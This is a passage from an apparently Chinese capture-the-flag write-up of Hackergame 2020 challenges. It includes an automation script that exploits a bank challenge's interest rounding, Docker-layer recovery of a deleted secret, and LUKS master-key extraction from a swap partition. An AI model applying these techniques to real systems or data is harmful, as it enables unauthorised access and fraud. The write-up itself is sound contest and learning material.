class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 